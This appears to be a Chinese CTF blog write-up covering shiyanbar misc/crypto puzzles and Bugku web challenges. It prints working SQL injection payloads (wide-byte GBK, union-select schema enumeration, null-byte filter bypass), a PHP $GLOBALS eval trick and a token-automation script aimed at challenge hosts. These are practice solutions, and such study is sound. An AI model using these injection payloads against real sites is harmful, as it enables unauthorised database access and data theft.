id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><p><a href="http://ctf5.shiyanbar.com/misc/mimimi.zip">题目地址</a></p><p>给了一个压缩包和一个MP3文件，压缩包是有密码的，看起来密码在mp3中，使用Audacity分析音频无果，尝试mp3stego,密码尝试一下Canon.</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-1.png"></p><p>解密获得密码，将压缩文件中的文档解压出来，看起来像是base64，直接扔到工具里解一下，然后直接搜一下CTF，找的flag</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-2.png"></p><p>flag为</p><pre><code>CTF&#123;WONVPAO AIUWNVPAOINE&#125;</code></pre><h2 id="ROT13变身了"><a href="#ROT13变身了" class="headerlink" title="ROT13变身了"></a>ROT13变身了</h2><p><a href="http://ctf5.shiyanbar.com/misc/rot-13.txt"> 题目地址 </a></p><p>提示</p><pre><code>1、回旋13，回不回？ 2、有81,450,625种可能性</code></pre><p>密文给了很多数字，看起来是ASCII,看题目应该不是普通的ROT·13，尝试将ASCII码减去13再转字符串，写脚本</p><pre><code>#Python3#-*-coding:utf-8-*-encodetxt = &quot;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&quot;st = encodetxt.split(&#39; &#39;)for i in range(len(st)):    st[i] = int(st[i]) - 13    print(chr(st[i]),end=&#39;&#39;)</code></pre><p>输出如下</p><pre><code>FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;MD5:38e4c352809e150186920aac37190cbc</code></pre><p>再写脚本爆破</p><pre><code>    import hashlibdef MD5(data):    m2 = hashlib.md5()    m2.update(data)    return m2.hexdigest()s = &quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;x = &quot;38e4c352809e150186920aac37190cbc&quot;for i in range(32,127):    for j in range(32,127):        for h in range(32,127):            for k in range(32,127):                st = s + chr(i) + chr(j) + chr(h) + chr(k) + &quot;&#125;&quot;                st = str(st)                re = MD5(st)                if(re == x):                    print(st)</code></pre><p>flag为</p><pre><code>flag&#123;www_shiyanbar_com_is_very_good_@8Mu&#125;</code></pre><h2 id="解码磁带"><a href="#解码磁带" class="headerlink" title="解码磁带"></a>解码磁带</h2><p><a href="http://ctf5.shiyanbar.com/misc/cidai.html"> 题目地址 </a></p><p>这个题考查字符转化为二进制，再翻译成对应的字符串，写脚本如下</p><pre><code># -*- coding:utf-8 -*- def bin2dec(string_num):    return str(int(string_num, 2))f = open(&#39;233.txt&#39;,&#39;r&#39;)file = open(&#39;re.txt&#39;,&#39;w&#39;)a = f.read()a = a.replace(&#39;o&#39;, &#39;1&#39;)a = a.replace(&#39;_&#39;, &#39;0&#39;)st = a.split(&#39;\n&#39;)for i in st:    file.write(chr(int(bin2dec(i))))    file.write(&#39;\n&#39;)f.close()file.close()</code></pre><p>flag为</p><pre><code>simCTF&#123;Where there is a will,there is a way.&#125;</code></pre><h2 id="功夫秘籍"><a href="#功夫秘籍" class="headerlink" title="功夫秘籍"></a>功夫秘籍</h2><p><a href="http://ctf5.shiyanbar.com/423/misc/kungfu.rar"> 题目地址 </a></p><p>使用winhex打开，在文件尾处发现线索</p><pre><code>key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg </code></pre><p>很明显是base64,解密得</p><pre><code>T_ysK9_5rhk__uFMt&#125;3El&#123;nu@E </code></pre><p>看起来像是栅栏，直接解密</p><pre><code>Th3_kEy_ls_&#123;Kun9Fu_M@5tEr&#125;</code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>题目描述:</p><pre><code>小明某一天收到一封密信，信中写了几个不同的年份    辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。信的背面还写有“+甲子”，请解出这段密文。key值：CTF&#123;XXX&#125;</code></pre><p>解题过程</p><pre><code>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳28 30 23 8 17 10 16 30甲子是 60</code></pre><p>每个数字分别加上60，为</p><pre><code>88 90 83 68 77 70 76 90</code></pre><p>转ASCII</p><pre><code>XZSDMFLZ</code></pre><p>转栅栏</p><pre><code>4XZSDMFLZXMZFSLDZ2XZSDMFLZXSMLZDFZ</code></pre><p>将上述两条分别用恺撒密码暴力破解下，可以获得明文</p><pre><code>message = &#39;此处填写要破解的密文&#39;LETTERS = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;letters = &#39;abcdefghijklmnopqrstuvwxyz&#39;for key in range(len(LETTERS)):    tran = &#39;&#39;    for i in message:        if i in LETTERS:            num = LETTERS.find(i)            num = num - key            if num &lt; 0:                num = num + len(LETTERS)            tran = tran + LETTERS[num]        elif i in letters:            num = letters.find(i)            num = num - key            if num &lt; 0:                num = num + len(letters)            tran = tran + letters[num]        else:            tran = tran + i    print(&#39;key = %s: %s&#39; % (key, tran.lower()))</code></pre><p>flag为</p><pre><code>CTF&#123;SHUANGYU&#125;</code></pre><h2 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h2><p><a href="http://ctf5.shiyanbar.com:8080/4/index.html"> 题目地址 </a></p><p>访问地址，右键查看源代码。发现一串密文</p><pre><code>&lt;!-- #@~^TgAAAA==&#39;[6*liLa6++p&#39;aXvfiLaa6i[[avWi[[a*p[[6*!I&#39;[6cp&#39;aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#~@ --&gt;</code></pre><p>解密地址</p><pre><code>http://www.dheart.net/decode/index.php</code></pre><p>解得flag为</p><pre><code>Encode@decode </code></pre><p>ps:最后有个空格</p><h2 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h2><p><a href="http://ctf5.shiyanbar.com/crypto/winrar/"> 题目地址 </a></p><p>给了一大串16进制字符</p><pre><code>526172211A0700CF907300000D0000000000000056947424965E00600000004900000002E3B1696DEE413D3B1D33310020000000C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD234784B6DD58B0A427929591366006C6F7665002E7478742E2E5B7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D16712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F142EC43D7B00400700</code></pre><p>将其粘贴到Winhex中保存为新文件，保存后将扩展名改为rar,即可打开，但是有密码。根据提示</p><pre><code>password crack, 65h -- 71h</code></pre><p>猜测密码为winhex中65-71的16进制对应的字符的值。</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-1.png"></p><p>将其粘贴出来，即可解压出文件，去网上找个在线计算sha1的网站</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-2.png"></p><p>sha1为</p><pre><code>SHA1: 58a09ae43e5a9df9ad5e89f90c1bb7430dc5bd02 </code></pre><p>所以flag为</p><pre><code>58a09ae4</code></pre><h2 id="我喜欢培根"><a href="#我喜欢培根" class="headerlink" title="我喜欢培根"></a>我喜欢培根</h2><p>给了长长的一大串摩尔斯电码</p><pre><code>-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -..MORSEISCOOLBUTBACONISCOOLERDCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD</code></pre><p>密文</p><pre><code>DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD</code></pre><p>手撕(ง •_•)ง c是a,d是b</p><pre><code>DCCDC sCCDDD hCDCCC iDDCCC yCCCCC aCDDCD nCCCCD bCCCCC aCDCCC iDCCDC sCCCDC cCDDDC oCDDDC oCDCDD l</code></pre><p>百度百科第一种方式可以成功解码,不过坑爹的答案是</p><pre><code>CTF&#123;SHIYANBA IS COOL&#125;</code></pre><p>。。。</p><h2 id="围在栅栏中的爱"><a href="#围在栅栏中的爱" class="headerlink" title="围在栅栏中的爱"></a>围在栅栏中的爱</h2><p>题目描述</p><pre><code> 最近一直在好奇一个问题，QWE到底等不等于ABC？-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- flag格式：CTF&#123;xxx&#125; </code></pre><p>密文首先解码莫尔斯密码</p><pre><code>KIQLWTFCQGNSOO</code></pre><p>提示qwe等于abc,即</p><pre><code>qwertyuiopasdfghjklzxcvbnmabcdefjhijklmnopqrstuvwxyz</code></pre><p>解密得</p><pre><code>RHASBENVAOYLII</code></pre><p>再解栅栏</p><pre><code>rabnayihsevoli</code></pre><p>再逆序</p><pre><code>iloveshiyanbar</code></pre><p>最后提交</p><pre><code>CTF&#123;iloveshiyanbar&#125;</code></pre><h2 id="奇怪的字符串"><a href="#奇怪的字符串" class="headerlink" title="奇怪的字符串"></a>奇怪的字符串</h2><p>题目描述</p><pre><code> 信息保密的需求和实际操作自古有之，与之相应的信息加密与解密也是历史悠久，现有一段经过古典密码理论（不止一种）加密的密文，内容如下：89 51 82 109 89 50 86 122 97 71 107 61请找出这段密文隐藏的消息明文 </code></pre><p>密文<br>    89 51 82 109 89 50 86 122 97 71 107 61<br>ASCII转字符</p><pre><code>Y3RmY2VzaGk=</code></pre><p>解base64</p><pre><code>ctfceshi</code></pre><p>直接提交即可</p><h2 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h2><p>题目给了一大串16进制字符</p><pre><code>0xcode></pre><p>转字符</p><pre><code>%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d</code></pre><p>很明显是url编码，转一下</p><pre><code>MTE5CjEwMQoxMDgKOTkKMTExCjEwOQoxMDEKMTE2CjExMQoxMTUKMTA0CjEwNQoxMjEKOTcKMTEwCjk4Cjk3CjExNA==</code></pre><p>base64解码</p><pre><code>119 101 108 99 111 109 101 116 111 115 104 105 121 97 110 98 97 114</code></pre><p>ASCII转一下字符    </p><pre><code>welcometoshiyanbar</code></pre><p>答案为<br>    ctf{welcometoshiyanbar}</p><h2 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h2><p>提示</p><pre><code>与键盘有关</code></pre><p>密文</p><pre><code>BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN</code></pre><p>根据上述字母在键盘上的位置按顺序连成线，画出字符</p><pre><code>NBNCBNNBNBC</code></pre><p>直接提交即可</p><h2 id="NSCTF-crypto50"><a href="#NSCTF-crypto50" class="headerlink" title="NSCTF crypto50"></a>NSCTF crypto50</h2><p>给了一串密文</p><pre><code>U2FsdGVkX1+qtU8KEGmMJwGgKcPUK3XBTdM+KhNRLHSCQL2nSXaW8++yBUkSylRp </code></pre><p>AES在线解密</p><pre><code>http://tool.oschina.net/encrypt</code></pre><p>解密获得</p><pre><code>flag&#123;DISJV_Hej_UdShofjyed&#125;</code></pre><p>凯撒移位一下</p><pre><code>flag&#123;NSCTF_Rot_EnCryption&#125;</code></pre><h2 id="疑惑的汉字"><a href="#疑惑的汉字" class="headerlink" title="疑惑的汉字"></a>疑惑的汉字</h2><pre><code> 现有一段经过加密的密文，内容如下：王夫 井工 夫口 由中人 井中 夫夫 由中大。请找出这段密文隐藏的消息明文。格式：CTF&#123; &#125;</code></pre><p>很明显是当铺密码，直接解密</p><pre><code>67 84 70 123 82 77 125 </code></pre><p>ASCII转字符</p><pre><code>CTF&#123;RM&#125;</code></pre><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><pre><code>密文内容如下&#123;79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65&#125;请对其进行解密提示：1.加解密方法就在谜面中     2.利用key值的固定结构格式：CTF&#123; &#125; </code></pre><p>密文<br>    79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65</p><p>ASCII转字符</p><pre><code>OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA</code></pre><p>古典密码最基本的加密方法就是置换</p><pre><code>OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA</code></pre><p>列置换拼凑出CTF{}(存在4种可能)</p><pre><code>CTF&#123;OCULDYOEUXCHANEGTHEINOFRMATINO&#125;CTF&#123;OCULDYOEUXCHANEGTHEINOFRMATINO&#125;CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;CTF&#123;COUUDYOLEXGHANCETFEINHOROATIMN&#125;CTF&#123;COUUDYOLEXGHANCETFEINHOROATIMN&#125;CTF&#123;OCUUDYOELXGHANECTFEINOHROATINM&#125;CTF&#123;OCUUDYOELXGHANECTFEINOHROATINM&#125;</code></pre><p>经过尝试，flag为</p><pre><code>CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;</code></pre><h2 id="The-Flash-14"><a href="#The-Flash-14" class="headerlink" title="The Flash-14"></a>The Flash-14</h2><pre><code>这些数字都是什么呢~   54433252224455342251522244342223113412答案形式ctf&#123;XXX&#125; </code></pre><p>闪电侠第二季第14集有个加密方式</p><p>密码表</p><p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-Theflash-14.jpg"></p><pre><code>54 43 32 52 22 44 55 34 22 51 52 22 44 34 22 23 11 34 12YSMWGTZOGVWGTOGHAOB</code></pre><p>凯撒解密</p><pre><code>key = 14: KEYISFLASHISFASTMAN</code></pre><p>最后答案为</p><pre><code>ctf&#123;flashisfastman&#125;</code></pre><h2 id="凯撒是罗马共和国杰出的军事统帅"><a href="#凯撒是罗马共和国杰出的军事统帅" class="headerlink" title="凯撒是罗马共和国杰出的军事统帅"></a>凯撒是罗马共和国杰出的军事统帅</h2><p>密文</p><pre><code>MGAKUZKRWZWGAWCP</code></pre><p>直接暴力破解</p><pre><code>key = 2: KEYISXIPUXUEYUAN</code></pre><p>最后的flag为</p><pre><code>XIPUXUEYUAN</code></pre><h2 id="摩擦摩擦"><a href="#摩擦摩擦" class="headerlink" title="摩擦摩擦"></a>摩擦摩擦</h2><p>密文</p><pre><code>&quot;.-- . .-.. -.-. --- -- . - --- -..- .. .--. ..- -..- ..- . -.-- ..- .- -.&quot;</code></pre><p>直接在线解码摩尔斯电码</p><pre><code>WELCOMETOXIPUXUEYUAN</code></pre><h2 id="最近听说刘翔离婚了"><a href="#最近听说刘翔离婚了" class="headerlink" title="最近听说刘翔离婚了"></a>最近听说刘翔离婚了</h2><p>密文</p><pre><code>kyssmlxeei&#123;ipeu&#125;</code></pre><p>刘翔 -&gt; 跨栏 -&gt; 栅栏</p><p>分为两栏解栅栏</p><pre><code>keyis&#123;simplexue&#125; </code></pre><h2 id="奇妙的音乐"><a href="#奇妙的音乐" class="headerlink" title="奇妙的音乐"></a>奇妙的音乐</h2><p>解压给的压缩包，给了一个图片和一个有密码的压缩包，压缩包里面有个wav文件，给的图片上画着一本书的2封面，上面写着海伦凯勒，而且下面有某种编码</p><p>图1</p><p>联想海伦凯勒的身份，应该是盲文，百度百科翻译一下</p><pre><code>kmdonowg</code></pre><p>这个就是压缩文件的密码，直接解压，打开音乐是滴滴答答的声音，很明显是摩尔斯电码，借助Audacity将其提取出来。</p><p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p><p>解码得</p><pre><code>CTFWPEI08732?23DZ</code></pre><p>实验吧的答案就是坑，还得小写</p><pre><code>CTF&#123;wpei08732?23dz&#125;</code></pre><h2 id="敌军情报"><a href="#敌军情报" class="headerlink" title="敌军情报"></a>敌军情报</h2><pre><code> 知彼知己方能百战不殆。天枢战队成员截获了一条命令密文45 46 45 46 32 45 32 46 46 45 46 32 46 45 32，你能解密成明文，做到知己知彼吗？格式：CTF&#123; &#125; </code></pre><p>密文</p><pre><code>45 46 45 46 32 45 32 46 46 45 46 32 46 45 32</code></pre><p>看起来像ASCII码，直接转换</p><pre><code>-.-. - ..-. .- </code></pre><p>摩尔斯电码，解码</p><pre><code>CTFA</code></pre><p>坑爹的答案</p><pre><code>CTF&#123;a&#125;</code></pre><h2 id="Fair-Play"><a href="#Fair-Play" class="headerlink" title="Fair-Play"></a>Fair-Play</h2><p>题目描述</p><pre><code>The quick brown fox jumps over the lazy dog!   ihxo&#123;smzdodcikmodcismzd&#125;</code></pre><p>百度一下Fair-Play，找到了playfair密码，猜测密钥为</p><pre><code>The quick brown fox jumps over the lazy dog!</code></pre><p>编制密码表,由于密文中没有j，因此要把密码表中的j去掉</p><pre><code>thequickbrownfoxumpsoverthelazydog</code></pre><p>密码表为</p><pre><code>t h e q ui c k b ro w n f xm p s v la z y d g</code></pre><p>手撕….</p><pre><code>ih xo sm zd od     ci km     od     ci sm zdct fx pl ay af(fa) ir si(is) af(fa) ir pl ay</code></pre><p>整理下，明文应该是</p><pre><code>ctfx&#123;playfairisfairplay&#125;</code></pre><p>奇葩的答案。。还带个x…</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku部分题目Writeup</title>
    <link href="/2017/10/10/Bugku%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/"/>
    <url>/2017/10/10/Bugku%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteup/</url>
    
    <content type="html"><![CDATA[<p>持续更新中。。</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><a href="http://120.24.86.145:8002/web2/" title="题目地址">题目地址</a></p><p>这题上来一大堆滑稽，特别炫酷。。</p><p>用Burp抓包和firebug审查元素都没找到有用的东西，最后不小心碰了下F12..惊现flag..<br><img src="https://image.mengsec.com/bugku-Web2.png"><br>告诉自己以后别忘了“右键”-“查看元素”</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a href="http://103.238.227.13:10083/" title="题目地址">题目地址</a><br>首先抓了个包。<br>发现编码方式为GBK，经过测试后为宽字节注入。</p><pre><code>http://103.238.227.13:10083/?id=-1%d5&#39;显示：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1誠&#39;&#39; LIMIT 1&#39; at line 1</code></pre><p>发现注入方法就好办了，直接order by 判断有多少列</p><pre><code>http://103.238.227.13:10083/?id=-1%d5%27 order by 1 --+页面正常http://103.238.227.13:10083/?id=-1%d5%27 order by 2 --+页面正常http://103.238.227.13:10083/?id=-1%d5%27 order by 3 --+报错：Unknown column &#39;3&#39; in &#39;order clause&#39;</code></pre><p>说明数据库有两列<br>然后查询数据库名称</p><pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select null,database() --+显示为sql5</code></pre><p>查询sql5的所有表名：</p><pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() --+ 显示为key,test</code></pre><p>查询所有字段名：</p><pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select null,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() --+显示为id,string,id,key</code></pre><p>查询字段内容：</p><pre><code>http://103.238.227.13:10083/?id=-1%d5%27 union select 1,group_concat(id,0x7e,string) FROM .key --+key    1~54f3320dc261f313ba712eb3f13a1f6d,2~aaaaaaaaaa</code></pre><p>根据题目要求：查询key表,id=1的string字段<br>可得string的内容为54f3320dc261f313ba712eb3f13a1f6d</p><p>flag为</p><pre><code>KEY&#123;54f3320dc261f313ba712eb3f13a1f6d&#125;</code></pre><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p><a href="http://103.238.227.13:10087/" title="题目地址">题目地址</a></p><p>判断列数：</p><pre><code>http://103.238.227.13:10087/?id=1 o%00rder by 1正常回显http://103.238.227.13:10087/?id=1 o%00rder by 2正常回显http://103.238.227.13:10087/?id=1 o%00rder by 3没有正常回显</code></pre><p>确定列数为2</p><p>查询数据库名称</p><pre><code>http://103.238.227.13:10087/?id=1 uni%00on sel%00ect 1,database() --+</code></pre><p>数据库名称为sql3<br>然后查询数据库的所有的表名</p><pre><code>http://103.238.227.13:10087/?id=1 un%00ion s%00elect 1,group_concat(tab%00le_name) FR%00OM info%00rmation_schema.t%00ables WHE%00RE ta%00ble_schema=database() --+</code></pre><p>返回：hash,key,temp</p><p>然后查询key中的字段hash的内容：</p><pre><code>http://103.238.227.13:10087/?id=1 un%00ion sel%00ect 1,gr%00oup_co%00ncat(id,0x7e,hash) FR%00OM .key --+</code></pre><p>返回1~c3d3c17b4ca7f791f85e#$1cc72af274af4adef</p><pre><code>因此hash字段的内容应为c3d3c17b4ca7f791f85e#$1cc72af274af4adef</code></pre><p>所以flag为：<br>​<br>    KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p><a href="http://120.24.86.145:8004/index1.php" title="题目地址">题目地址</a></p><pre><code>flag In the variable ! &lt;?php  error_reporting(0);include &quot;flag1.php&quot;;highlight_file(__file__);if(isset($_GET[&#39;args&#39;]))&#123;    $args = $_GET[&#39;args&#39;];    if(!preg_match(&quot;/^\w+$/&quot;,$args))&#123;        die(&quot;args error!&quot;);    &#125;eval(&quot;var_dump($$args);&quot;);&#125;?&gt;</code></pre><p>看样子关键点在</p><pre><code>eval(&quot;var_dump($$args);&quot;);</code></pre><p>此处考察了PHP的一个小知识点–超全局变量</p><blockquote><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。<br>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p></blockquote><p>因此令$args=GLOBALS可以使得</p><pre><code>eval(&quot;var_dump($GLOBALS);&quot;);</code></pre><p>从而打印出所有全局变量的值</p><p>Payload:</p><pre><code>http://120.24.86.145:8004/index1.php?args=GLOBALS</code></pre><p>回显</p><pre><code>array(7) &#123; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;ZFkwe3&quot;]=&gt; string(38) &quot;flag&#123;92853051ab894a64f7865cf3c2128b34&#125;&quot; [&quot;args&quot;]=&gt; string(7) &quot;GLOBALS&quot; &#125; </code></pre><p>因此flag为</p><pre><code>flag&#123;92853051ab894a64f7865cf3c2128b34&#125;</code></pre><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><a href="http://120.24.86.145:8002/web4/index.php" title="题目地址">题目地址</a></p><p>根据提示右键查看源代码，发现一段JS代码</p><pre><code>&lt;script&gt;var p1 = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;var p2 = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));&lt;/script&gt;</code></pre><p>URL解码得</p><pre><code>var p1 = &#39;function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b&#39;;var p2 = &#39;aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;&#39;;eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));</code></pre><p>虽然没学过JS,但编程语言的思想都差不多。<br>最后执行的语句应该是</p><pre><code>function checkSubmit()&#123;    var a=document.getElementById(&quot;password&quot;);    if(&quot;undefined&quot;!=typeof a)    &#123;        if(&quot;67d709b2b&#39;+&#39;54aa2&#39;+&#39;aa648cf6e87a7114f1&quot;==a.value)        return!0;        alert(&quot;Error&quot;);        a.focus();        return!1    &#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;&#39;;</code></pre><p>尝试提交”67d709b2b’+’54aa2’+’aa648cf6e87a7114f1”<br>即67d709b2b54aa2aa648cf6e87a7114f1</p><p>获得flag:<br>​<br>    KEY{J22JK-HS11}</p><h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p><a href="http://120.24.86.145:8002/chengjidan/" title="题目地址">题目地址</a></p><p>查询成绩，明显是考察SQL注入，经过测试为Post注入。</p><p>有四个查询位而且都有回显。</p><p>查询数据库名称：</p><pre><code>id=-1%27union select database(),2,3,4%23回显：skctf_flag</code></pre><p>查询表名：</p><pre><code>id=-1%27union select table_name,2,3,4 from information_schema.tables where TABLE_SCHEMA=database() LIMIT 0,1%23回显：fl4g</code></pre><p>查询字段名：</p><pre><code>id=-1%27union select column_name,2,3,4 from information_schema.columns where TABLE_SCHEMA=database() and table_name=&#39;fl4g&#39; LIMIT 0,1%23回显：skctf_flag</code></pre><p>查询字段内容：</p><pre><code>id=-1%27union select skctf_flag,2,3,4 from fl4g%23回显：BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;</code></pre><p>flag为：<br>​<br>    BUGKU{Sql_INJECT0N_4813drd8hz4}<br>当时校赛这题没做出来。。(╯‵□′)╯︵┻━┻</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><a href="http://120.24.86.145:8002/web6/" title="题目地址">题目地址</a></p><p>右键查看网页源代码：<br>​<br>    <!-- OK ,now you have to post the margin what you find --><br>没别的东西，抓包试一下。发现在响应包中返回了一个flag参数，而且每次都会变。<br>比如：</p><pre><code>flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT0RFeU5EQTQ=</code></pre><p>解码后：</p><pre><code>跑的还不错，给你flag吧: ODEyNDA4</code></pre><p>再次解码：</p><pre><code>812408</code></pre><p>根据提示提交每次解码后获得的margin参数来获取flag。写脚本：<br>​<br>    #-<em>-coding:utf-8-</em>-</p><pre><code>import requestsimport base64url = &quot;http://120.24.86.145:8002/web6/&quot;r = requests.session()headers = r.get(url).headersx = base64.b64decode(headers[&#39;flag&#39;]).split(&#39;:&#39;)key = base64.b64decode(x[1])data = &#123;&#39;margin&#39;:key&#125;re = r.post(url = url, data = data).contentprint (re)</code></pre><p>flag为</p><pre><code>KEY&#123;111dd62fcd377076be18a&#125;</code></pre><h2 id="cookies欺骗？？"><a href="#cookies欺骗？？" class="headerlink" title="cookies欺骗？？"></a>cookies欺骗？？</h2><p><a href="http://120.24.86.145:8002/web11/" 